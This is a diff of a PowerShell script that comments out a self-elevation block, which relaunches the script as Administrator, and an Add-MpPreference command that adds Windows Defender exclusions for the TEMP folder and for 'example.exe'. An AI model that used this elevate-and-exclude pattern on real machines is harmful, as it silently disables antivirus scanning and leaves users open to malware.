@@ -10,13 +10,13 @@
 
 
 
-# Check if running with Administrator privileges
-If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # Relaunch PowerShell as administrator
-    $arguments = "& '" + $myinvocation.MyCommand.Definition + "'"
-    Start-Process powershell -Verb runAs -ArgumentList $arguments
-    Exit
-}
+# # Check if running with Administrator privileges
+# If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+#     # Relaunch PowerShell as administrator
+#     $arguments = "& '" + $myinvocation.MyCommand.Definition + "'"
+#     Start-Process powershell -Verb runAs -ArgumentList $arguments
+#     Exit
+# }
 
 # # Load Windows Forms assembly
 # Add-Type -AssemblyName 'System.Windows.Forms'
@@ -29,10 +29,10 @@ If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 
 
-# If script reaches here, it is running with Administrator privileges
-Write-Host "This script is running with Administrator privileges."
+# # If script reaches here, it is running with Administrator privileges
+# Write-Host "This script is running with Administrator privileges."
 
-Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
+# Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
 # Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 # ##############################################################################
